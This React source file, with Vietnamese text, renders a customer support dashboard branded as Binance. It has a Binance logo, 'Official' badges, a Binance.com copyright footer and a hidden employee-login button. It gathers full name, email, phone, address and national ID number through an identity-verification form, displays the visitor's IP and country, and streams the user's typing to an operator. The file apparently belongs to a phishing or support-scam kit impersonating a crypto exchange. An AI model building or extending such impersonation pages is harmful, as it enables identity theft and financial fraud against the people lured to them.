
import React, { useState, useEffect } from 'react';
import { Ticket, Message, CustomerProfile, TicketPost, PostComment } from '../types';
import { BinanceFullLogo, ShieldCheckIcon, UserIcon, GlobeIcon, BinanceIconB, AdminAvatarIcon, TicketIcon, BotIcon, SendIcon, LockIcon } from './Icons';
import CustomerChatWidget from './CustomerChatWidget';

interface CustomerDashboardProps {
  tickets: Ticket[];
  messages: Message[];
  onCreateTicket: (subject: string, description: string) => void;
  onSendMessage: (text: string, file?: File) => void;
  onTyping: (text: string) => void;
  onLogout: () => void;
  activeTicketId: string | null;
  onSelectTicket: (id: string) => void;
  isDarkMode: boolean;
  onRequestProfileUpdate: (ticketId: string, profile: Partial<CustomerProfile>) => void;
  onAddPost: (ticketId: string, post: Omit<TicketPost, 'id' | 'timestamp' | 'comments'>) => void;
  onAddComment: (ticketId: string, postId: string, comment: Omit<PostComment, 'id' | 'timestamp'>) => void;
  isChatOpen: boolean; 
  setIsChatOpen: (isOpen: boolean) => void; 
  onAdminRequest?: () => void;
}

const CustomerDashboard: React.FC<CustomerDashboardProps> = ({ 
    tickets, messages, onSendMessage, onTyping, activeTicketId, onRequestProfileUpdate, onAddComment,
    isChatOpen, setIsChatOpen, onAdminRequest
}) => {
  const [showKycModal, setShowKycModal] = useState(false);
  const [commentText, setCommentText] = useState('');
  const [kycForm, setKycForm] = useState<Partial<CustomerProfile>>({});
  
  // Luôn lấy ticket đầu tiên hoặc ticket active
  const activeTicket = tickets.find(t => t.id === activeTicketId) || tickets[0];
  const activeMessages = messages.filter(m => m.ticketId === activeTicket?.id);

  // FIX: Move useEffect UP before conditional returns to avoid "Rendered more hooks" error
  useEffect(() => {
      if (activeTicket && activeTicket.profile) {
          setKycForm(activeTicket.profile);
      }
  }, [activeTicket]);

  // Loading UI chuyên nghiệp hơn
  if (!activeTicket) {
      return (
          <div className="min-h-screen flex flex-col items-center justify-center bg-[#FAFAFA] dark:bg-[#0B0E11] font-sans">
              <div className="flex flex-col items-center animate-fade-in">
                  <div className="w-16 h-16 bg-[#1E2329] rounded-full flex items-center justify-center shadow-lg mb-6 relative">
                     <BinanceIconB className="w-8 h-8 text-[#FCD535]" />
                     <div className="absolute inset-0 border-4 border-[#FCD535] rounded-full opacity-20 animate-ping"></div>
                  </div>
                  <h2 className="text-xl font-bold text-[#1E2329] dark:text-white mb-2">Đang kết nối đến Trung tâm Hỗ trợ</h2>
                  <p className="text-gray-400 text-sm">Vui lòng chờ trong giây lát, hệ thống đang cấp phát Case ID...</p>
                  
                  <div className="mt-8 flex gap-2">
                    <span className="w-2 h-2 bg-[#FCD535] rounded-full animate-bounce"></span>
                    <span className="w-2 h-2 bg-[#FCD535] rounded-full animate-bounce [animation-delay:0.2s]"></span>
                    <span className="w-2 h-2 bg-[#FCD535] rounded-full animate-bounce [animation-delay:0.4s]"></span>
                  </div>
              </div>
          </div>
      );
  }

  // Determine user status
  const isPending = !!activeTicket.pendingProfile;
  const isVerified = !!activeTicket.profile && !isPending;
  const isOutdated = !activeTicket.profile && !isPending;

  const handlePostComment = (postId: string) => {
      if (!commentText.trim()) return;
      onAddComment(activeTicket.id, postId, {
          authorName: activeTicket.profile?.fullName || 'Tôi',
          authorRole: 'customer',
          content: commentText
      });
      setCommentText('');
  };

  const handleUpdateProfile = (e: React.FormEvent) => {
      e.preventDefault();
      if (activeTicket) {
          onRequestProfileUpdate(activeTicket.id, kycForm);
          setShowKycModal(false);
      }
  };

  const DeviceCard = ({ info }: { info: any }) => (
      <div className="bg-white dark:bg-[#1E2329] p-4 rounded-xl border border-gray-100 dark:border-gray-800 shadow-sm mb-4 hidden md:block">
          <h3 className="text-xs font-bold text-gray-400 uppercase mb-3 flex items-center gap-2">
              <GlobeIcon className="w-4 h-4" /> Thông tin thiết bị
          </h3>
          <div className="space-y-3 text-sm">
              <div className="flex justify-between items-center pb-2 border-b border-gray-50 dark:border-gray-800">
                  <span className="text-gray-500">Địa chỉ IP</span>
                  <span className="font-mono bg-gray-100 dark:bg-black px-2 py-1 rounded text-xs">{info?.ip || '...'}</span>
              </div>
              <div className="flex justify-between items-center pb-2 border-b border-gray-50 dark:border-gray-800">
                  <span className="text-gray-500">Khu vực</span>
                  <span>{info?.country || '...'}</span>
              </div>
          </div>
      </div>
  );

  const ProfileCard = ({ profile }: { profile: CustomerProfile | undefined }) => {
      const hasProfileData = profile && Object.keys(profile).length > 0;

      const InfoRow = ({ label, value }: { label: string, value?: string }) => (
          <div className="flex justify-between items-center py-2.5 border-b border-gray-100 dark:border-gray-700 last:border-0 last:pb-0">
              <span className="text-xs font-semibold text-gray-500 uppercase tracking-wide">{label}</span>
              <span className="text-sm font-bold text-[#1E2329] dark:text-white truncate max-w-[60%] text-right">{value || '--'}</span>
          </div>
      );

      return (
        <div className="bg-white dark:bg-[#1E2329] p-6 rounded-xl border border-gray-100 dark:border-gray-800 shadow-sm transition-all duration-300 hover:shadow-md">
            <div className="flex flex-col items-center mb-6">
                 <div className="relative">
                    <div className="w-20 h-20 bg-[#FCD535] rounded-full flex items-center justify-center text-3xl font-extrabold text-[#1E2329] mb-4 shadow-lg shadow-yellow-400/20 z-10 relative">
                        {profile?.fullName ? profile.fullName.charAt(0).toUpperCase() : <UserIcon className="w-8 h-8"/>}
                    </div>
                 </div>
                 
                 <h2 className="text-xl font-extrabold dark:text-white mb-2 text-center">{profile?.fullName || 'Khách Hàng'}</h2>
                 
                 <div className="flex flex-wrap gap-2 justify-center">
                     {isVerified ? (
                        <>
                            <span className="px-2 py-1 bg-green-100 text-green-700 text-xs font-bold rounded flex items-center gap-1"><ShieldCheckIcon className="w-3 h-3"/> Đã xác minh</span>
                        </>
                     ) : isPending ? (
                        <span className="px-2 py-1 bg-orange-100 text-orange-700 text-xs font-bold rounded flex items-center gap-1">⏳ Chờ duyệt</span>
                     ) : (
                        <span className="px-2 py-1 bg-gray-100 text-gray-600 text-xs font-bold rounded">Chưa xác minh</span>
                     )}
                 </div>
            </div>

            {hasProfileData && (
                <div className="mb-6 bg-gray-50 dark:bg-[#2B3139]/50 rounded-xl p-4 border border-gray-100 dark:border-gray-700/50">
                    <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-200 dark:border-gray-700">
                        <TicketIcon className="w-4 h-4 text-[#FCD535]" />
                        <h3 className="text-xs font-bold text-gray-800 dark:text-gray-200 uppercase">Hồ sơ cá nhân</h3>
                    </div>
                    <div className="flex flex-col">
                        <InfoRow label="Họ và Tên" value={profile?.fullName} />
                        <InfoRow label="Email" value={profile?.email} />
                        <InfoRow label="Số điện thoại" value={profile?.phone} />
                        <InfoRow label="Số CCCD" value={profile?.idCard} />
                    </div>
                </div>
            )}

            <button 
                onClick={() => setShowKycModal(true)} 
                className={`w-full py-3 rounded-lg font-bold text-sm transition-all border flex items-center justify-center gap-2 ${
                    isOutdated 
                    ? 'bg-[#FCD535] hover:bg-[#F0B90B] text-black border-[#FCD535]' 
                    : 'bg-transparent hover:bg-gray-50 dark:hover:bg-gray-800 text-gray-500 border-gray-200 dark:border-gray-700'
                }`}
            >
                <ShieldCheckIcon className="h-4 w-4" />
                {hasProfileData ? 'Chỉnh sửa hồ sơ' : 'Xác minh danh tính ngay'}
            </button>
        </div>
      );
  };

  return (
    <div className="min-h-screen bg-[#FAFAFA] dark:bg-[#0B0E11] font-sans text-[#1E2329] dark:text-[#EAECEF] flex flex-col">
        {/* HEADER */}
        <nav className="h-16 border-b border-[#EAECEF] dark:border-[#2B3139] flex items-center justify-between px-6 sticky top-0 bg-white dark:bg-[#181A20] z-40 shadow-sm">
            <div className="flex items-center gap-4">
                <BinanceFullLogo className="h-6 text-[#FCD535]" />
                {/* Live Indicator */}
                <div className="hidden md:flex items-center gap-2 bg-gray-50 dark:bg-[#2B3139] px-2 py-1 rounded-full border border-gray-100 dark:border-gray-700">
                    <span className="relative flex h-2 w-2">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                        <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                    </span>
                    <span className="text-[10px] font-bold text-gray-500 uppercase">Live Sync</span>
                </div>
            </div>
            <div className="flex items-center gap-3">
                <div className="text-xs font-bold text-gray-500 uppercase tracking-wide hidden md:block">
                    Trung tâm hỗ trợ khách hàng
                </div>
            </div>
        </nav>

        {/* KYC MODAL */}
        {showKycModal && (
            <div className="fixed inset-0 z-[150] bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
                <div className="bg-white dark:bg-[#1E2329] w-full max-w-lg rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
                    <div className="p-5 border-b border-gray-100 dark:border-gray-800 flex justify-between items-center bg-gray-50 dark:bg-[#2B3139]">
                        <h3 className="text-lg font-bold flex items-center gap-2">
                            <ShieldCheckIcon className="w-5 h-5 text-[#FCD535]" /> Xác Minh Danh Tính
                        </h3>
                        <button onClick={() => setShowKycModal(false)} className="p-2 hover:bg-gray-200 dark:hover:bg-gray-700 rounded-full">✕</button>
                    </div>
                    <div className="p-6 overflow-y-auto">
                        <form onSubmit={handleUpdateProfile} className="space-y-4">
                            <div>
                                <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Họ và Tên</label>
                                <input className="w-full p-3 border rounded-lg bg-white dark:bg-black dark:border-gray-700" value={kycForm.fullName || ''} onChange={e => setKycForm({...kycForm, fullName: e.target.value})} placeholder="Nguyễn Văn A" required />
                            </div>
                            <div>
                                <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Email</label>
                                <input className="w-full p-3 border rounded-lg bg-white dark:bg-black dark:border-gray-700" value={kycForm.email || ''} onChange={e => setKycForm({...kycForm, email: e.target.value})} required />
                            </div>
                            <div className="grid grid-cols-2 gap-4">
                                <div>
                                    <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Số CCCD</label>
                                    <input className="w-full p-3 border rounded-lg bg-white dark:bg-black dark:border-gray-700" value={kycForm.idCard || ''} onChange={e => setKycForm({...kycForm, idCard: e.target.value})} required />
                                </div>
                                <div>
                                    <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Điện thoại</label>
                                    <input className="w-full p-3 border rounded-lg bg-white dark:bg-black dark:border-gray-700" value={kycForm.phone || ''} onChange={e => setKycForm({...kycForm, phone: e.target.value})} required />
                                </div>
                            </div>
                            <div>
                                <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Địa chỉ</label>
                                <input className="w-full p-3 border rounded-lg bg-white dark:bg-black dark:border-gray-700" value={kycForm.address || ''} onChange={e => setKycForm({...kycForm, address: e.target.value})} required />
                            </div>
                            <button type="submit" className="w-full py-3 bg-[#FCD535] hover:bg-[#F0B90B] text-black font-bold rounded-lg shadow-md mt-4">Gửi Hồ Sơ</button>
                        </form>
                    </div>
                </div>
            </div>
        )}

        <div className="flex-1 max-w-7xl mx-auto w-full p-4 lg:p-8 grid grid-cols-1 lg:grid-cols-12 gap-6 lg:gap-8 pb-24 md:pb-8">
            
            {/* LEFT COLUMN - MAIN CASE FEED (8 cols) */}
            <div className="lg:col-span-8 space-y-6">
                
                {/* CASE HEADER CARD */}
                <div className="bg-white dark:bg-[#1E2329] rounded-2xl p-6 border border-gray-100 dark:border-gray-800 shadow-sm">
                    <div className="flex justify-between items-start mb-2">
                         <div className="flex items-center gap-3">
                            <h1 className="text-xl font-bold dark:text-white">Case ID: <span className="font-mono text-gray-500">#{activeTicket.id}</span></h1>
                            <span className="px-2 py-0.5 bg-green-100 text-green-700 text-xs font-bold rounded uppercase">Active</span>
                         </div>
                    </div>
                    <p className="text-sm text-gray-500">Đội ngũ hỗ trợ đã tiếp nhận yêu cầu và đang xử lý.</p>
                </div>

                {/* POSTS FEED */}
                <div className="space-y-6">
                    {activeTicket.posts.map((post) => (
                        <div key={post.id} className="bg-white dark:bg-[#1E2329] rounded-2xl border border-gray-100 dark:border-gray-800 shadow-sm overflow-hidden">
                            <div className="p-6 border-b border-gray-50 dark:border-gray-800">
                                <div className="flex items-center gap-3 mb-4">
                                    <div className="w-10 h-10 bg-[#FCD535] rounded-full flex items-center justify-center text-black">
                                        <BinanceIconB className="w-5 h-5" />
                                    </div>
                                    <div>
                                        <div className="flex items-center gap-2">
                                            <h3 className="font-bold text-sm dark:text-white">{post.authorName}</h3>
                                            <span className="px-1.5 py-0.5 bg-[#FCD535] text-black text-[10px] font-bold rounded flex items-center gap-1">
                                                <ShieldCheckIcon className="w-3 h-3"/> Official
                                            </span>
                                        </div>
                                        <p className="text-xs text-gray-400">{new Date(post.timestamp).toLocaleString('vi-VN')}</p>
                                    </div>
                                </div>
                                <h4 className="font-bold text-lg mb-2 dark:text-white">{post.subject}</h4>
                                <p className="text-gray-600 dark:text-gray-300 leading-relaxed whitespace-pre-line text-sm">{post.content}</p>
                                {post.image && (
                                    <div className="mt-4 rounded-lg overflow-hidden border border-gray-100 dark:border-gray-700">
                                        <img src={post.image} alt="Post content" className="w-full h-auto object-cover max-h-80" />
                                    </div>
                                )}
                            </div>

                            <div className="bg-gray-50 dark:bg-[#0B0E11] p-4 space-y-4">
                                {post.comments.map((comment) => (
                                    <div key={comment.id} className="flex gap-3">
                                        <div className="shrink-0 mt-1">
                                            {comment.authorRole === 'admin' ? (
                                                <div className="w-6 h-6 bg-[#1E2329] rounded-full flex items-center justify-center text-[#FCD535]">
                                                    <AdminAvatarIcon className="w-3 h-3" />
                                                </div>
                                            ) : (
                                                <div className="w-6 h-6 bg-gray-200 rounded-full flex items-center justify-center text-gray-500">
                                                    <UserIcon className="w-3 h-3" />
                                                </div>
                                            )}
                                        </div>
                                        <div className="flex-1">
                                            <div className={`p-3 rounded-2xl text-sm inline-block ${comment.authorRole === 'admin' ? 'bg-[#FFFBEA] border border-[#FCD535]/30 text-black' : 'bg-white border border-gray-200 text-gray-700'}`}>
                                                <p className="font-bold text-xs mb-1 opacity-70">{comment.authorName}</p>
                                                {comment.content}
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>

                            <div className="p-3 bg-white dark:bg-[#1E2329] border-t border-gray-100 flex gap-2">
                                <input 
                                    className="flex-1 bg-gray-50 dark:bg-[#0B0E11] rounded-lg px-4 py-2 text-sm outline-none focus:ring-1 focus:ring-[#FCD535] dark:text-white"
                                    placeholder="Viết bình luận..."
                                    value={commentText}
                                    onChange={(e) => setCommentText(e.target.value)}
                                    onKeyDown={(e) => e.key === 'Enter' && handlePostComment(post.id)}
                                />
                                <button onClick={() => handlePostComment(post.id)} className="p-2 text-[#FCD535] font-bold"><SendIcon className="w-5 h-5"/></button>
                            </div>
                        </div>
                    ))}
                </div>
            </div>

            {/* RIGHT COLUMN - SIDEBAR INFO (4 cols) */}
            <div className="lg:col-span-4 space-y-6">
                <ProfileCard profile={activeTicket.profile} />
                <DeviceCard info={activeTicket.customerInfo} />
            </div>
        </div>

        {/* Chat Widget & FAB */}
        <CustomerChatWidget 
            messages={activeMessages}
            onSendMessage={onSendMessage}
            onTyping={onTyping}
            isTyping={!!activeTicket?.typingPreview}
            isOpen={isChatOpen}
            onToggle={() => setIsChatOpen(!isChatOpen)}
            embedded={false}
            adminNotes={activeTicket?.adminNotes}
            adminTyping={activeTicket?.adminTyping}
        />
        
        {!isChatOpen && (
             <div className="fixed bottom-6 right-6 z-50">
                 <button 
                    onClick={() => setIsChatOpen(true)}
                    className="w-14 h-14 bg-[#FCD535] rounded-full shadow-lg hover:shadow-2xl hover:scale-105 transition-all flex items-center justify-center text-[#1E2329] relative group border-2 border-white dark:border-[#1E2329]"
                 >
                     <BotIcon className="w-7 h-7" />
                     <span className="absolute top-0 right-0 -mt-0.5 -mr-0.5 flex h-4 w-4">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                        <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500 border-2 border-white"></span>
                    </span>
                 </button>
             </div>
        )}

        {/* PROFESSIONAL FOOTER WITH HIDDEN ADMIN ACCESS */}
        <footer className="mt-auto py-6 border-t border-gray-100 dark:border-gray-800 text-center">
            <div className="flex items-center justify-center gap-4 text-xs text-gray-400">
                <span>© 2024 Binance.com. All rights reserved.</span>
                <span className="w-1 h-1 bg-gray-300 rounded-full"></span>
                <span>Privacy Policy</span>
                <span className="w-1 h-1 bg-gray-300 rounded-full"></span>
                <span>Terms of Use</span>
                <button 
                    onClick={onAdminRequest} 
                    className="ml-2 text-gray-300 hover:text-[#FCD535] transition-colors" 
                    title="Employee Login"
                >
                    <LockIcon className="w-3 h-3" />
                </button>
            </div>
        </footer>
    </div>
  );
};

export default CustomerDashboard;
